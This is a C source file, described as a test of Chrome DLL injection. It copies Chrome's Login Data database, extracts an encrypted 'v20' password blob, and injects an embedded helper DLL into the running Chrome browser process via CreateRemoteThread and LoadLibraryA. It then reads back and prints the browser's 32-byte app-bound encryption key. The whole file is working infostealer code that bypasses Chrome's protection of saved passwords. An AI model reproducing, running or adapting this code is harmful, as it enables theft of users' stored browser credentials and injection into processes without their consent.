/*
 * test_inject2.c — test Chrome DLL injection with correct SQLite hint
 */
#include "../include/chrome_key_helper_blob.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* ── Minimal SQLite reader ── */
static uint16_t be16(const uint8_t *p){ return (uint16_t)((p[0]<<8)|p[1]); }
static uint32_t be32(const uint8_t *p){ return ((uint32_t)p[0]<<24)|((uint32_t)p[1]<<16)|((uint32_t)p[2]<<8)|(uint32_t)p[3]; }
static int sqv(const uint8_t *p,const uint8_t *e,uint64_t *v){
    uint64_t r=0;int n=0;
    while(p+n<e&&n<8){uint8_t b=p[n++];r=(r<<7)|(b&0x7f);if(!(b&0x80)){*v=r;return n;}}
    if(p+n<e)r=(r<<8)|p[n++];*v=r;return n;
}
static uint32_t sqsl(uint64_t t){
    if(!t)return 0;if(t<=4)return(uint32_t)t;if(t==5)return 6;
    if(t==6||t==7)return 8;if(t==8||t==9)return 0;
    if(t>=12&&!(t&1))return(uint32_t)((t-12)/2);
    if(t>=13&&(t&1))return(uint32_t)((t-13)/2);return 0;
}
#define NCOLS 32
typedef struct{uint64_t ty[NCOLS];const uint8_t *v[NCOLS];uint32_t l[NCOLS];int n;}Row;
typedef void(*CB)(void*,const Row*);
static void leaf(const uint8_t *db,uint32_t pgsz,uint32_t pgno,int p1,CB cb,void*cx){
    const uint8_t *page=db+(uint64_t)(pgno-1)*pgsz;
    int h=p1?100:0;if(page[h]!=0x0D)return;
    uint16_t nc=be16(page+h+3);
    const uint8_t *arr=page+h+8,*pe=page+pgsz;
    for(uint16_t i=0;i<nc;i++){
        if(arr+i*2+1>=pe)break;uint16_t off=be16(arr+i*2);
        if(off<(uint16_t)h||off+2>=(uint32_t)pgsz)continue;
        const uint8_t *c=page+off;uint64_t pl=0,ri=0;int n;
        n=sqv(c,pe,&pl);if(n<=0)continue;c+=n;
        n=sqv(c,pe,&ri);if(n<=0)continue;c+=n;
        const uint8_t *pay=c;if(pay+pl>pe)continue;
        uint64_t hs=0;n=sqv(pay,pay+pl,&hs);if(n<=0||hs>pl)continue;
        const uint8_t *tp=pay+n,*he=pay+hs,*vp=pay+hs;
        Row row;row.n=0;
        while(tp<he&&row.n<NCOLS){
            uint64_t t=0;n=sqv(tp,he,&t);if(n<=0)break;tp+=n;
            uint32_t vl=sqsl(t);if(vp+vl>pay+pl)break;
            row.ty[row.n]=t;row.v[row.n]=vp;row.l[row.n]=vl;row.n++;vp+=vl;
        }
        if(row.n>0)cb(cx,&row);
    }
}
static void walk(const uint8_t *db,uint32_t pgsz,size_t dbsz,uint32_t pgno,int d,CB cb,void*cx){
    if(d>20)return;
    uint64_t off=(uint64_t)(pgno-1)*pgsz;
    if(off+pgsz>dbsz)return;
    const uint8_t *page=db+off;
    int p1=(pgno==1),h=p1?100:0;
    if(page[h]==0x05){
        uint16_t nc=be16(page+h+3);uint32_t right=be32(page+h+8);
        const uint8_t *arr=page+h+12;
        for(uint16_t i=0;i<nc;i++){
            if(arr+i*2+1>=page+pgsz)break;uint16_t co=be16(arr+i*2);
            if(co<(uint16_t)h+4||co>=(uint32_t)pgsz)continue;
            walk(db,pgsz,dbsz,be32(page+co),d+1,cb,cx);
        }
        walk(db,pgsz,dbsz,right,d+1,cb,cx);
    }else if(page[h]==0x0D)leaf(db,pgsz,pgno,p1,cb,cx);
}
typedef struct{const char *t;uint32_t rp;}Find;
static void fcb(void*cx,const Row *r){
    Find *f=(Find*)cx;if(f->rp||r->n<4)return;
    if(!(r->ty[0]>=13&&(r->ty[0]&1)))return;
    if(r->l[0]!=5||memcmp(r->v[0],"table",5))return;
    if(!(r->ty[1]>=13&&(r->ty[1]&1)))return;
    size_t nl=strlen(f->t);
    if(r->l[1]!=(uint32_t)nl||memcmp(r->v[1],f->t,nl))return;
    uint64_t t=r->ty[3];if(t<1||t>9)return;
    uint32_t rp=0;for(uint32_t i=0;i<r->l[3];i++)rp=(rp<<8)|r->v[3][i];
    f->rp=rp;
}
typedef struct{int ok;uint8_t nonce[12];uint8_t ct[512];size_t ct_len;uint8_t tag[16];}Hint;
static void hcb(void*cx,const Row *r){
    Hint *h=(Hint*)cx;if(h->ok||r->n<6)return;
    uint32_t bl=r->l[5];const uint8_t *b=r->v[5];
    if(bl<3+12+1+16||memcmp(b,"v20",3))return;
    size_t ct=bl-3-12-16;if(!ct||ct>512)return;
    memcpy(h->nonce,b+3,12);memcpy(h->ct,b+3+12,ct);memcpy(h->tag,b+bl-16,16);
    h->ct_len=ct;h->ok=1;
}

/* ── SHM (must match chrome_key_helper.c) ── */
#define SHM_MAGIC 0xCEC0FFEE
#pragma pack(push,1)
typedef struct{
    uint32_t magic;uint8_t nonce[12];uint8_t ct[512];uint32_t ct_len;uint8_t tag[16];
    volatile int found;uint8_t key[32];
    volatile int32_t dbg_pages,dbg_unprotect_ok,dbg_gcm_tried;
}SHM;
#pragma pack(pop)

static DWORD find_browser(void){
    HANDLE s=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(s==INVALID_HANDLE_VALUE)return 0;
    PROCESSENTRY32 pe;pe.dwSize=sizeof(pe);
    DWORD best=0;SIZE_T bb=0;
    if(Process32First(s,&pe))do{
        if(_stricmp(pe.szExeFile,"chrome.exe"))continue;
        HANDLE hp=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,pe.th32ProcessID);
        if(!hp)continue;
        SIZE_T tot=0;MEMORY_BASIC_INFORMATION m;uint8_t *a=NULL;
        while(VirtualQueryEx(hp,a,&m,sizeof(m))==sizeof(m)){
            a=(uint8_t*)m.BaseAddress+m.RegionSize;
            if(m.State==MEM_COMMIT&&(m.Protect&PAGE_READWRITE))tot+=m.RegionSize;
        }
        CloseHandle(hp);
        fprintf(stderr,"  PID %lu RW=%zuMB\n",(unsigned long)pe.th32ProcessID,(size_t)(tot>>20));
        if(tot>bb){bb=tot;best=pe.th32ProcessID;}
    }while(Process32Next(s,&pe));
    CloseHandle(s);
    return best;
}

int main(void){
    /* Get Login Data */
    char tmp[MAX_PATH];GetTempPathA(sizeof(tmp),tmp);
    char tmpf[MAX_PATH];snprintf(tmpf,sizeof(tmpf),"%s~i2test.tmp",tmp);
    char src[MAX_PATH];
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",src,sizeof(src));
    if(!CopyFileA(src,tmpf,FALSE)){fprintf(stderr,"CopyFile failed\n");return 1;}
    HANDLE hf=CreateFileA(tmpf,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    LARGE_INTEGER li={0};GetFileSizeEx(hf,&li);
    uint8_t *db=(uint8_t*)malloc((size_t)li.QuadPart+1);
    DWORD rd=0;ReadFile(hf,db,(DWORD)li.QuadPart,&rd,NULL);CloseHandle(hf);DeleteFileA(tmpf);

    uint16_t ps=be16(db+16);uint32_t pgsz=(ps==1)?65536u:(uint32_t)ps;
    Find f={"logins",0};walk(db,pgsz,(size_t)rd,1,0,fcb,&f);
    fprintf(stderr,"logins rootpage=%u\n",f.rp);
    Hint hint={0};if(f.rp)walk(db,pgsz,(size_t)rd,f.rp,0,hcb,&hint);
    free(db);
    if(!hint.ok){fprintf(stderr,"No v20 hint\n");return 1;}
    fprintf(stderr,"Hint: nonce=%02x%02x%02x%02x  ct_len=%zu\n",
            hint.nonce[0],hint.nonce[1],hint.nonce[2],hint.nonce[3],hint.ct_len);

    fprintf(stderr,"Finding Chrome browser process...\n");
    DWORD bpid=find_browser();
    fprintf(stderr,"Browser PID: %lu\n",(unsigned long)bpid);
    if(!bpid){fprintf(stderr,"Chrome not running\n");return 1;}

    /* Shared memory */
    char sn[64],en[64];
    snprintf(sn,sizeof(sn),"ChromeKeyExtract_%lu",(unsigned long)bpid);
    snprintf(en,sizeof(en),"ChromeKeyDone_%lu",(unsigned long)bpid);
    HANDLE hm=CreateFileMappingA(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,sizeof(SHM),sn);
    SHM *shm=(SHM*)MapViewOfFile(hm,FILE_MAP_ALL_ACCESS,0,0,0);
    memset(shm,0,sizeof(*shm));
    shm->magic=SHM_MAGIC;
    memcpy(shm->nonce,hint.nonce,12);
    memcpy(shm->ct,hint.ct,hint.ct_len);
    shm->ct_len=(uint32_t)hint.ct_len;
    memcpy(shm->tag,hint.tag,16);
    HANDLE he=CreateEventA(NULL,FALSE,FALSE,en);
    ResetEvent(he); /* clear stale signal from previous run */

    /* Drop DLL — unique name per run so LoadLibraryA forces a fresh load */
    char dp[MAX_PATH];snprintf(dp,sizeof(dp),"%s~ck%llu.dll",tmp,(unsigned long long)GetTickCount64());
    HANDLE hd=CreateFileA(dp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    DWORD wr=0;WriteFile(hd,chrome_key_helper_dll,chrome_key_helper_dll_len,&wr,NULL);
    CloseHandle(hd);
    fprintf(stderr,"DLL dropped (%u bytes): %s\n",wr,dp);

    HANDLE hp=OpenProcess(PROCESS_ALL_ACCESS,FALSE,bpid);
    fprintf(stderr,"OpenProcess: %p  err=%lu\n",(void*)hp,GetLastError());
    if(!hp)goto done;

    LPVOID rp=VirtualAllocEx(hp,NULL,strlen(dp)+1,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    SIZE_T nw=0;WriteProcessMemory(hp,rp,dp,strlen(dp)+1,&nw);
    fprintf(stderr,"Injected path: %p (%zu bytes)\n",rp,(size_t)nw);

    HMODULE k32=GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLLA=(LPTHREAD_START_ROUTINE)GetProcAddress(k32,"LoadLibraryA");
    HANDLE ht=CreateRemoteThread(hp,NULL,0,pLLA,rp,0,NULL);
    fprintf(stderr,"CreateRemoteThread: %p  err=%lu\n",(void*)ht,GetLastError());

    if(ht){
        Sleep(1000); /* give DLL time to load + open SHM before waiting */
        fprintf(stderr,"Waiting 30s for done event...\n");
        DWORD wr2=WaitForSingleObject(he,30000);
        fprintf(stderr,"Result: %lu (0=OK, 258=TIMEOUT)\n",(unsigned long)wr2);
        fprintf(stderr,"Debug: pages=%d  unprotect_ok=%d  gcm_tried=%d  found=%d\n",
                shm->dbg_pages,shm->dbg_unprotect_ok,shm->dbg_gcm_tried,shm->found);
        if(shm->found){
            fprintf(stderr,"KEY: ");
            for(int i=0;i<32;i++)fprintf(stderr,"%02x",shm->key[i]);
            fprintf(stderr,"\n");
        }
        WaitForSingleObject(ht,5000);CloseHandle(ht);
    }
    VirtualFreeEx(hp,rp,0,MEM_RELEASE);
    CloseHandle(hp);

done:
    UnmapViewOfFile(shm);CloseHandle(hm);CloseHandle(he);
    DeleteFileA(dp);
    return shm&&shm->found?0:1;
}
